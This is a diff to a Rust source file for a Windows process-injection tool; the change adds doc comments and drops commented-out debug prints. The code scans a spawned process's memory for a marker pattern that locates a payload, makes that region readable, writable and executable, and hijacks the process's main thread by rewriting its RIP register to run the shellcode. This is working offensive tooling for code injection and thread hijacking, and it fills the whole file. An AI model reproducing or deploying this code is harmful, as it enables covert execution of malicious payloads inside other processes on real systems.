@@ -9,6 +9,10 @@ use windows::Win32::Foundation::{HANDLE_FLAG_INHERIT, HANDLE, SetHandleInformati
 use windows::Win32::System::Diagnostics::Debug::{CONTEXT_FULL_AMD64, CONTEXT,GetThreadContext, ReadProcessMemory, SetThreadContext};
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_PRIVATE, PAGE_EXECUTE_READWRITE, PAGE_GUARD, PAGE_NOACCESS, MEMORY_BASIC_INFORMATION, PAGE_PROTECTION_FLAGS, VirtualProtectEx, VirtualQueryEx};
 
+/// A struct for store the different hStd
+/// 
+/// Keep a trace of four Handle created by CreatePipe 
+/// and SECURITY_ATTRIBUTES.
 pub struct Handle {
     pub h_std_in_read: HANDLE,
     pub h_std_in_write: HANDLE,
@@ -17,6 +21,13 @@ pub struct Handle {
     pub security_attr: SECURITY_ATTRIBUTES,
 }
 
+
+/// MemoryInfo store information about the process created
+/// 
+/// Keep trace of region base address where the pattern was found
+/// Keep trace of region size
+/// Keep trace at which offset the pattern was found
+/// Keep trace of oldflags of memory region
 #[derive(Default)]
 pub struct MemoryInfo {
     pub r_base_addr: usize,
@@ -25,6 +36,13 @@ pub struct MemoryInfo {
     pub oldflag: PAGE_PROTECTION_FLAGS,
 }
 
+
+/// Get the args passing by the user
+/// 
+/// # Returns
+/// 
+/// On success, returns a CString
+/// On failure, returns NulError
 pub fn get_args() -> Result<CString,NulError> {
 
     let args: Vec<String> = env::args().collect();
@@ -41,7 +59,11 @@ pub fn get_args() -> Result<CString,NulError> {
 
 }
 
-
+/// Create the four pipes that are used for communication with remote process
+/// 
+/// # Returns
+/// 
+/// On success, returns struct Handle
 pub fn create_pipe() -> Handle {
 
     let mut h_std_in_r: HANDLE = HANDLE(ptr::null_mut());
@@ -103,6 +125,18 @@ pub fn create_pipe() -> Handle {
 
 }
 
+
+/// Usefull for finding where the payload is on remote memory process
+/// 
+/// # Arguments
+/// 
+/// * `ns_handl` - Handle on the remote process created
+/// * `pattern` - The pattern to found
+/// 
+/// # Returns
+/// 
+/// On succes, returns Option<MemoryInfo>
+/// On failure, returns None
 pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
     
     let mut system_info: SYSTEM_INFO = SYSTEM_INFO {..Default::default()};
@@ -152,7 +186,6 @@ pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
         }
 
 
-        // println!("[*] Reading @ {:#x}, Region size: {:?}",current_addr,memory_info.RegionSize);
         let region_start: usize = current_addr;
         // loop for full reading memory region
         loop {
@@ -170,7 +203,6 @@ pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
 
                 match result {
                     Ok(_) => {
-                        // println!("[+] Successfully reading @ {:#x}, length {:?}",current_addr,bytes_read);
                         let index = read_memory_buffer.windows(pattern.len()).position(|window| window == pattern);
                         match index {
                             Some(idx) => {
@@ -200,6 +232,12 @@ pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
 }
 
 
+/// Change the region protection where the payload is stored to RWX.
+/// 
+/// # Arguments
+/// 
+/// * `ns_handle` - Handle on the remote process
+/// * `mem_info` - A reference to the structure MemoryInfo
 pub fn change_protect(ns_handle: HANDLE, mem_info: &MemoryInfo){
 
     let new_page_protect: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
@@ -220,6 +258,17 @@ pub fn change_protect(ns_handle: HANDLE, mem_info: &MemoryInfo){
 
 }
 
+
+/// Hijack the main thread of remote process
+/// 
+/// This function use the wellknown method,
+/// SuspendThread -> GetThread -> SetThread -> ResumeThread
+/// to change the RIP pointer and send where the shellcode is stored
+/// 
+/// # Arguments
+/// 
+/// * `ns_thread` - The handle of the remote process main thread
+/// * `offset` - The address where the payload is stored
 pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64){
 
     println!("[*] Hijacking main thread...");
@@ -237,9 +286,11 @@ pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64){
 
     println!("[*] The RIP point at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);
 
+    // change rip pointer
     let addr_payload: u64 = offset + 15 as u64;
     context.Rip = addr_payload;
 
+    // set the context
     let result = unsafe { SetThreadContext(ns_thread, &context as *const CONTEXT)};
     match result {
         Ok(_) => println!("[+] Successfully set thread context"),
@@ -248,6 +299,7 @@ pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64){
 
     println!("[*] The RIP point now at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);
 
+    // resume the thread
     let result = unsafe { ResumeThread(ns_thread)};
     
     println!("[+] Successfully resuming main thread: {:?}",result);
